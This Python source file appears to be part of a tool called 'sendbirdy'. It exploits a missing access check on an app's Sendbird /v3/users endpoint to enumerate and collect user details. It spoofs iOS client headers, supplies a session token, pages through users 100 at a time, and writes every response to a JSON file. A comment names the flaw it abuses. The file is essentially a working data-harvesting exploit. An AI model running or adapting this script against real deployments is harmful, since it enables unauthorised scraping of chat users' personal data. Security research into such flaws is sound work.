import requests
import time
import datetime

from pyjavaproperties import Properties

import lib.utils.constants as c
import lib.utils.jsonformatter as formatter
import lib.core.module_parser as parser


def requestSender(app):

    p = Properties()
    p.load(open('res/proj.properties'))

    ts = time.gmtime()
    dt = datetime.datetime.now().strftime("%Y%m%d%H%M")

    outdir = str(p.getProperty("OUTDIR"))
    outfile = outdir + dt + ".json"

    ## Define the GET Request URL
    urlHeader = parser.parse_headers(c.app,'url-format','urlheader')
    urlTail = parser.parse_headers(c.app,'url-format','urlTail')
    url = urlHeader + parser.parse_yaml(c.app,'sendbird-id') + urlTail
    print("{!} " + url)

    # Determine how many round need to be run (due to response limit of 100)
    #       note that response limit can change and is set by API admin
    numOfRound = c.users_to_enumerate / 100
    roundCounter = numOfRound


    # TODO replace hard-coded headers and ploads with YAML file ones
    i = 1
    while roundCounter > 0:
        print("{!}----- Staring sendbirdy round [" + str(i) + "]-----")
        ploads = {'public_mode': 'all'}
        ploads['limit'] = parser.parse_yaml(c.app,'request_limit')

        # This is where the vulnerability lies, not all users should have access to the /v3/users/ directory
        # Some implementation of sendbird restrict access here, and only allow authenticated users to the /v3/users/[user-id] directory
        headers = {'Accept-Encoding': 'gzip, deflate',
                   'SendBird': 'iOS,13.5,3.0.178,3CDAD91C-1E0D-4A0D-BBEE-9671988BF9E9',
                   'Request-Sent-Timestamp': '1591543666234', 'Accept': 'application/json',
                   'User-Agent': 'Jios/3.0.178', 'SB-User-Agent': 'iOS/c3.0.178', 'Accept-Language': 'en-ca', }
        headers['Host'] = parser.parse_yaml(c.app,'sendbird-id') + '.sendbird.com'
        headers['Session-Key'] = parser.parse_yaml(c.app,'session-token')

        # Make GET request from applicaiton server,
        r = requests.get(url, params=ploads, headers=headers)

        try:
            f = open(outfile, "a")
            f.write(r.text + '\n')
            f.close()
        except IOError as e:
            print("{!}----- I/O error({0}): {1} Could not find" + outfile)

        roundCounter -= 1
        i += 1
        print("{!}----- Sleeping for 5 seconds [x]-----")
        time.sleep(5)

    print("{!}----- Gathered [" + str(numOfRound * 100) + "] user details-----")
    print(c.indent_msg + c.indent_info + " Gathered [" + str(numOfRound * 100) + "] user details-----")
    print(c.indent_msg + c.indent_info + " Output Located : [" + outfile)

    formatter.format(outfile)

    return





